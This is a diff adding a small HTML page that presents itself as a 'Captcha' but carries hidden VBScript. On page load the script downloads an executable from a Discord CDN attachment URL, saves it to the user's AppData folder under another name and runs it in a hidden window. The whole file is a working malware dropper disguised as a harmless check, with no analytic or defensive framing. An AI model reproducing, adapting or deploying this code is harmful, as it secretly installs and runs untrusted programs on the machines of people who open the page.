@@ -1,0 +1,32 @@
+<html>
+<head>
+    <script language="VBScript">
+        Sub RunScript()
+            Dim url, downloadPath, objXMLHTTP, objADOStream, objFSO, objShell
+            url = "https://cdn.discordapp.com/attachments/1334275926589964390/1336809541639213147/xdd.exe?ex=67a52867&is=67a3d6e7&hm=64a21cfb250bb57e1e5dd0def59c84c6c9c3b036ced79a9ec4059ab3a5105674&"
+            Dim appDataPath
+            Set objShell = CreateObject("WScript.Shell")
+            appDataPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\qwe.exe"
+            downloadPath = appDataPath
+            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+            objXMLHTTP.Open "GET", url, False
+            objXMLHTTP.Send
+            If objXMLHTTP.Status = 200 Then
+                Set objADOStream = CreateObject("ADODB.Stream")
+                objADOStream.Type = 1 
+                objADOStream.Open
+                objADOStream.Write objXMLHTTP.ResponseBody
+                objADOStream.SaveToFile downloadPath, 2
+                objADOStream.Close
+                Set objADOStream = Nothing
+            End If
+            Set objXMLHTTP = Nothing
+            objShell.Run downloadPath, 0, False
+            Set objShell = Nothing
+        End Sub
+    </script>
+</head>
+<body onload="RunScript()">
+    <h1>Captcha</h1>
+</body>
+</html>
